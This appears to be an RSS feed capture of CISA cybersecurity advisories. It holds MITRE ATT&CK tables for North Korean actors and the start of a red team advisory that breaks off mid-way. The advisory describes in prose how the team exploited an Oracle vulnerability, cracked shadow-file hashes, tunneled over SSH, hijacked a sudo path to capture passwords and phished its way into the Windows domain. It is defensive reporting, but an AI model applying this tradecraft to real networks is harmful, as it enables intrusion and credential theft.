<li><a href=\"https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/\" title=\"North Korean threat actor targets small and midsize businesses with H0lyGh0st ransomware\">https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/</a></li>
</ul>
<p>NSCS Guidance:</p>
<ul>
<li>Alert: Apache Log4j Vulnerabilities: <a href=\"https://www.ncsc.gov.uk/news/apache-log4j-vulnerability\" title=\"Alert: Apache Log4j vulnerabilities\">https://www.ncsc.gov.uk/news/apache-log4j-vulnerability</a></li>
<li>Information: <a href=\"https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know\" title=\"Log4j vulnerability - what everyone needs to know\">https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know</a></li>
</ul>
<p>Symantec blog: <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research\" title=\"Clasiopa: New Group Targets Materials Research\">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research</a></p>
<p>VMware blog: <a href=\"https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html\" title=\"TigerRAT – Advanced Adversaries on the Prowl\">https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html</a></p>
<p>WithSecure Labs report: <a href=\"https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector\" title=\"No Pineapple! –DPRK Targeting of Medical Research and Technology Sector\">https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector</a></p>
<h2><strong>Appendix: MITRE ATT&amp;CK Techniques and Software</strong></h2>
<p>The tactics and techniques referenced in this advisory are identified in Table 3 – Table 12.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;3. Reconnaissance and Enumeration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Org Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information \">T1591</a></td>
<td>The actors gather information about the victim’s organization that can be used during targeting.</td>
</tr>
<tr>
<td>Gather Victim Host Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a></td>
<td>The actors gather information about the victim’s hosts that can be used during targeting.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a></td>
<td>The actors execute active reconnaissance scans to gather information that can be used during targeting.</td>
</tr>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>The actors search freely available technical databases for information about victims that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Resource Development, Tooling, and Remote Access Tools (RATs)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.</td>
</tr>
<tr>
<td>Develop Capabilities: Malware</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a></td>
<td>The actors develop malware and malware components that can be used during targeting.</td>
</tr>
<tr>
<td>Develop Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a></td>
<td>The actors develop exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Software used for Resource Development, Tooling, and RATs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Software Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Mimikatz</td>
<td><a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a></td>
<td>The actors use a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.</td>
</tr>
<tr>
<td>AdFind</td>
<td><a href=\"https://attack.mitre.org/versions/v13/software/S0552/\" title=\"AdFind\">S0552</a></td>
<td>The actors use a free command-line query tool that can be used for gathering information from the Active Directory.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>The actors attempt to exploit a weakness in an Internet-facing host or system to initially access a network.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a></td>
<td>The actors abuse command and script interpreters to execute commands, scripts, or binaries.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>The actors attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its content on the system or in transit.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Discovery and Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a></td>
<td>The actors use valid accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC.</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a></td>
<td>The actors use valid accounts to interact with a remote network share using Server Message Block (SMB).</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The actors enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.</td>
</tr>
<tr>
<td>Account Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a></td>
<td>The actors attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a></td>
<td>The actors establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, telnet, DNP3, and Modbus.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;12. Collection and Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Network Shared Drive</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a></td>
<td>The actors search network shares on computers they have compromised to find files of interest.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Exfiltration Over Web Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a></td>
<td>The actors use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.</td>
</tr>
</tbody>
</table>
</div>
</div>
") (pubDate nil "Wed, 24 Jul 2024 12:37:18 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21832")) (item nil (title nil " CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-193a") (description nil "<h3>EXECUTIVE SUMMARY</h3>
<p>In early 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a SILENTSHIELD red team assessment against a Federal Civilian Executive Branch (FCEB) organization. During SILENTSHIELD assessments, the red team first performs a no-notice, long-term simulation of nation-state cyber operations. The team mimics the techniques, tradecraft, and behaviors of sophisticated threat actors and measures the potential dwell time actors have on a network, providing a realistic assessment of the organization’s security posture. Then, the team works directly with the organization’s network defenders, system administrators, and other technical staff to address strengths and weaknesses found during the assessment. The team’s goal is to assist the organization with refining their detection, response, and hunt capabilities—particularly hunting unknown threats.</p>
<p>In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the red team’s activity and tactics, techniques, and procedures (TTPs); associated network defense activity; and lessons learned to provide network defenders with recommendations for improving their organization’s detection capabilities and cyber posture.</p>
<p>During the first phase, the SILENTSHIELD team gained initial access by exploiting a known vulnerability in an unpatched web server in the victim’s Solaris enclave. Although the team fully compromised the enclave, they were unable to move into the Windows portion of the network due to a lack of credentials. In a parallel effort, the team gained access to the Windows network through phishing. They then discovered unsecured administrator credentials, allowing them to pivot freely throughout the Windows environment, which resulted in full domain compromise and access to tier zero assets. The team then identified that the organization had trust relationships with multiple external partner organizations and was able to exploit and pivot to an external organization. The red team remained undetected by network defenders throughout the first phase.</p>
<p><strong>The red team’s findings underscored the importance of defense-in-depth and using diversified layers of protection.</strong>&nbsp;The organization was only able to fully understand the extent of the red team’s compromise by running full diagnostics from all data sources. This involved analyzing&nbsp;host-based logs, internal network logs, external (egress) network logs, and authentication logs.</p>
<p>The red team’s findings also demonstrated the value of using tool-agnostic and behavior-based indicators of compromise (IOCs) and of applying an “allowlist” approach to network behavior and systems, rather than a “denylist” approach, which predominantly results in an unmanageable amount of noise. The red team’s findings illuminated the following lessons learned for network defenders about how to reduce and respond to risk:</p>
<ul>
<li><strong>Lesson learned:</strong>&nbsp;The assessed organization had insufficient controls to prevent and detect malicious activity.</li>
<li><strong>Lesson learned:</strong> The organization did not effectively or efficiently collect, retain, and analyze logs.</li>
<li><strong>Lesson learned:</strong> Bureaucratic processes and decentralized teams hindered the organization’s network defenders.</li>
<li><strong>Lesson learned:</strong> A “known-bad” detection approach hampered detection of alternate TTPs.</li>
</ul>
<p>To reduce risk of similar malicious cyber activity, CISA encourages organizations to apply the recommendations in the Mitigations section of this advisory, including those listed below:</p>
<ul>
<li><strong>Apply defense-in-depth principles</strong> by using multiple layers of security to ensure comprehensive analysis and detection of possible intrusions.</li>
<li><strong>Use robust network segmentation</strong> to impede lateral movement across the network.</li>
<li><strong>Establish baselines of network traffic, application execution, and account authentication</strong>. Use these baselines to enforce an “allowlist” philosophy rather than denying known-bad IOCs. Ensure monitoring and detection tools and procedures are primarily behavior-based, rather than IOC-centric.</li>
</ul>
<p>CISA recognizes that insecure software contributes to these identified issues and urges software manufacturers to embrace&nbsp;<a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> principles and implement&nbsp;the recommendations in the Mitigations section of this CSA, including those listed below, to&nbsp;harden customer networks against malicious activity and reduce the likelihood of domain compromise:</p>
<ul>
<li><strong>Eliminate default passwords.</strong></li>
<li><strong>Provide logging at no additional charge</strong>.</li>
<li><strong>Work with security information and event management (SIEM) and security orchestration, automation, and response (SOAR) providers</strong>—in conjunction with customers—to understand how response teams use logs to investigate incidents.</li>
</ul>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/csa-cisa-red-team%27s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth</a>
    <span class=\"c-file__size\">(PDF,       1.18 MB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-10/csa-cisa-red-team_s-operations-against-a-fceb-organization-highlights-the-necessity-of-defense-in-depth_0_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-193A CISA Red Team’s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense-in-Depth - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       1.06 MB
  )</span>
  </div>
</div>
<h3>INTRODUCTION</h3>
<p>CISA has authority to hunt for and identify, with or without advance notice to or authorization from agencies, threats and vulnerabilities within federal information systems (see generally 44 U.S.C. § 3553[b][7]). The target organization for this assessment was a large U.S. FCEB organization. CISA conducted the SILENTSHIELD assessment over an approximately eight-month period in 2023, with three of the months consisting of a technical collaboration phase:</p>
<ul>
<li><strong>Adversary Emulation Phase:&nbsp;</strong>The team<strong>&nbsp;</strong>started by<strong>&nbsp;</strong>emulating a sophisticated nation-state actor by simulating known initial access and post-exploitation TTPs. The team’s goal was to compromise the assessed organization’s domain and identify attack paths to other networks. After completion of their initial objectives, the team diversified its deployed tools and tradecraft to mimic a wider and often less sophisticated set of threat actors to elicit network defender attention. CISA red team members did not clean up or delete system logs, allowing defenders to investigate all artifacts and identify the full scope of a breach.</li>
<li><strong>Collaboration Phase:</strong> The SILENTSHIELD team met regularly with senior staff and technical personnel to discuss issues with the organization’s cyber defensive capabilities. During this phase, the team:
<ul>
<li>Proposed new behavior-based and tool-agnostic detections to uncover additional tradecraft used during the Adversary Emulation Phase. They also evaluated the organization’s improvements according to current CISA priorities and public guidance.</li>
<li>Troubleshot existing detection steps to show how certain TTPs evaded IOC-based detections.</li>
<li>Deconflicted events from CISA red team activity, indicating unexpected network/application behavior or the potential presence of a real adversary in the network.<br><br><strong>Note:</strong> The team’s goal during this phase was to build the organization’s ability to detect malicious activity based on adversary behavior (i.e., TTPs) vice relying on known IOCs.</li>
</ul>
</li>
</ul>
<p>This advisory, drafted in coordination with the assessed organization, details the red team’s activity and TTPs, associated network defense activity, and lessons learned to provide network defenders recommendations for improving their organization’s defensive cyber posture. The advisory also provides recommendations to software manufacturers to harden their customer networks against malicious activity and reduce the likelihood of domain compromise.</p>
<h3>TECHNICAL DETAILS</h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.&nbsp;</p>
<p>During the Adversary Emulation phase, the red team gained initial access to the organization’s Solaris enclave by exploiting a known vulnerability in an unpatched web server. They gained separate access to the Windows environment by phishing and were able to compromise the full domain and its parent domain.&nbsp;See Figure 1 for a timeline of this assessment and the sections below for details on the team’s activity and TTPs.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%201%20-%20SILENTSHIELD%20Assessment%20Timeline.jpg?itok=-GInuA5O\" width=\"1024\" height=\"571\" alt=\"Figure 1: SILENTSHIELD Assessment Timeline\">


</div>
  </figure>
<h6>Figure 1: SILENTSHIELD assessment timeline</h6>
<h3>Adversary Emulation Phase</h3>
<h4><em>Exploitation of the Solaris Enclave</em></h4>
<h5><em>Reconnaissance, Initial Access, and Command and Control</em></h5>
<p>CISA’s red team used open source tools and third-party services to probe the organization’s internet-facing surface [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a>]. This included non-intrusive port scans for common ports and Domain Name System (DNS) enumeration [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\">T1590.002</a>]. These efforts revealed the organization’s web server was unpatched for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-21587\" title=\"CVE-2022-21587 Detail\">CVE-2022-21587</a>, an unauthenticated remote code execution (RCE) vulnerability in Oracle Web Applications Desktop Integrator. For three months the assessed organization failed to patch this vulnerability, and the team exploited it for initial access.</p>
<p>The exploit provided code execution on a backend application server (SERVER 1) that handled incoming requests from the public-facing web server. The red team used this exploit to upload and run a secure Python remote access tool (RAT). Because the application server had full external internet egress via Transmission Control Protocol (TCP) ports <code>80</code> and <code>443</code>, the RAT enabled consistent command and control (C2) traffic [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<p><strong>Note:</strong> After gaining access, the team promptly informed the organization’s trusted agents of the unpatched device, but the organization took over two weeks to apply the available patch. Additionally, the organization did not perform a thorough investigation of the affected servers, which would have turned up IOCs and should have led to a full incident response. About two weeks after the team obtained access, exploit code was released publicly into a popular open source exploitation framework. CISA identified that the vulnerability was exploited by an unknown third party. CISA added this CVE to its&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities Catalog</a> on Feb. 2, 2023.</p>
<h5><em>Credential Access, Command and Control, and Privilege Escalation</em></h5>
<p>Once on SERVER 1, the red team probed the host’s files and folder structure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1005/\" title=\"Data from Local System\">T1005</a>] and identified several old and globally accessible <code>.tar</code> backup files, which included a readable copy of an <code>/etc/shadow</code> file containing the hash for a privileged service account (ACCOUNT 1). The team quickly cracked the account’s weak password using a common wordlist [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/002/\" title=\"Brute Force: Password Cracking\">T1110.002</a>]. They then established an outbound Secure Shell Protocol (SSH) connection over TCP port <code>80</code> and used a reverse tunnel to SSH back into SERVER 1, where they were prompted to reset ACCOUNT 1’s expired password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>] (see Figure 2). The team identified the account was enabled on a subset of containers, but it had not been actively used in a significant amount of time; the team changed this account’s password to a strong password.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%202%20-%20Exploitation%20of%20the%20Solaris%20Enclave.jpg?itok=zdaEEFmf\" width=\"1024\" height=\"597\" alt=\"Figure 2: Exploitation of the Solaris Enclave\">


</div>
  </figure>
<h6>Figure&nbsp;2: Exploitation of the Solaris Enclave</h6>
<p>The team discovered ACCOUNT 1 was a local administrator with <code>sudo/root</code>&nbsp;access and used it to move laterally (see the next section).</p>
<h5><em>Lateral Movement and Persistence</em></h5>
<p>Servers in the Solaris enclave did not use centralized authentication but had a mostly uniform set of local accounts and permissions [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>]. This allowed the red team to use ACCOUNT 1 to move through much of the network segment via SSH [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/004/\" title=\"Remote Services: SSH\">T1021.004</a>].</p>
<p>Some servers allowed external internet access and the team deployed RATs on a few of these hosts for C2. They deployed several different RATs to diversify network traffic signatures and obfuscate the on-disk and in-memory footprints. These tools communicated to a red team redirector over TCP/<code>443</code>, through valid HTTPS messages, and over SSH through non-standard ports (<code>80</code> and <code>443</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1571/\" title=\"Non-Standard Port\">T1571</a>]. Much of the traffic was not blocked by a firewall, and the organization lacked application layer firewalls capable of detecting protocol mismatches on common ports.&nbsp;</p>
<p>The team then moved laterally to multiple servers, including high value assets, that did not allow internet access. Using reverse SSH tunnels, the team moved into the environment and used a SOCKS proxy [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a>] to progress forward through the network. They configured implants with TCP bind listeners bound to random high ports to connect directly with some of these hosts without creating new SSH login events (see Figure 3).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%203%20-%20Example%20of%20Lateral%20Movement%20in%20the%20Solaris%20Enclave.jpg?itok=5lQGbEQE\" width=\"1024\" height=\"430\" alt=\"Figure 3: Example of Lateral Movement in the Solaris Enclave\">


</div>
  </figure>
<h6>Figure 3: Example of Lateral Movement in the Solaris Enclave</h6>
<p>Once on other internal hosts, the team data mined each for sensitive information and credentials. They obtained personally identifiable information (PII), shadow files, a crackable pass-phrase protected administrator SSH key, and a plaintext password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/003/\" title=\"Unsecured Credentials: Bash History\">T1552.003</a>] in a user’s <code>.bash_history</code>. These data mined credentials provided further avenues for unprivileged access through the network. The team also used SSH tunnels to remotely mount Network File System (NFS) file shares, spoofing <code>uid</code>&nbsp;and <code>gid</code>&nbsp;values to access all files and folders.</p>
<p>To protect against reboots or other disruptions, the team primarily persisted on hosts using the <code>cron</code>&nbsp;utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/003/\" title=\"Scheduled Task/Job: Cron\">T1053.003</a>], as well as the <code>at</code> utility [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1053/002/\" title=\"Scheduled Task/Job: At\">T1053.002</a>], to run scheduled tasks and blend into the environment. Additionally, SSH private keys provided persistent access to internal pivot hosts and would have continued to enable access even if passwords were rotated.</p>
<h5><em>Full Enclave Compromise</em></h5>
<p>Although ACCOUNT 1 allowed the team to move laterally to much of the Solaris enclave, the account did not provide privileged access to all hosts in the network because a subset of hosts had changed the password (which denied privileged access via that account). However, the team analyzed recent user logins using the <code>last</code> command and identified a network security appliance scanning service account (ACCOUNT 2) that logged in regularly to an internal host using password-based authentication. As part of its periodic vulnerability scanning, ACCOUNT 2 would connect to each host via SSH and run <code>sudo</code> with a relative path instead of the absolute path <code>/usr/local/bin/sudo</code>. The local path created a path hijack vulnerability, which allowed the red team to hijack the execution flow and capture the account’s password [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1574/007/\" title=\"Hijack Execution Flow: Path Interception by PATH Environment Variable\">T1574.007</a>].</p>
<p>The harvested password granted unrestricted privileged access to the entire Solaris enclave.</p>
<h5><em>Exploitation of the Windows Domain</em></h5>
<p>While the compromise of the Solaris enclave facilitated months of persistent access to sensitive systems, including web applications and databases, it did not lead to the immediate compromise of the corporate Windows environment. Once in the Windows domain, the red team identified several service accounts with weak passwords. It is likely that an adversary could have continued the Solaris attack path through prolonged password spraying attacks, or by leveraging credentials obtained externally (e.g., dark web credential dumps) (see Figure 4).</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/Figure%204%20-%20Exploitation%20of%20Solaris%20Enclave.jpg?itok=DQzHfaVi\" width=\"1024\" height=\"498\" alt=\"Figure 4: Exploitation of Solaris Enclave\">


</div>
  </figure>
<h6>Figure 4: Exploitation of Solaris enclave</h6>
<p>The team exploited the Windows domain through other access vectors and eventually proved the undetected pivot between the domains could be made after they obtained Windows credentials.</p>
<h5><em>Reconnaissance and Initial Access</em></h5>
<p>While attempting to pivot into Windows from Solaris, the red team conducted open source information gathering about the organization. They harvested employee names [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/003/\" title=\"Gather Victim Identity Information: Employee Names\">T1589.003</a>] and used the information to derive email addresses based on the target’s email naming scheme. After identifying names, emails, and job titles, the team selected several phishing targets who regularly interacted with the public [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591/004/\" title=\"Gather Victim Org Information: Identify Roles\">T1591.004</a>]. One user triggered a phishing payload that provided initial access to a workstation.</p>
<p>The team then placed a simple initial access RAT on the workstation in a user-writable folder and obtained user-level persistence through an added registry run key, which called back to a red team redirector via HTTPS. The team assessed what was running on the host in terms of antivirus (AV) and Endpoint Detection and Response (EDR) and used the implant to inject a more capable, full-fledged RAT directly into memory, which pointed to a separate redirector. The assessed organization’s tools failed to categorize C2 traffic as anomalous even when a bug in one of the implants caused 8 GB of continuous network traffic to flow in one afternoon.</p>
<h5><em>Credentialed Access and Privilege Escalation</em></h5>
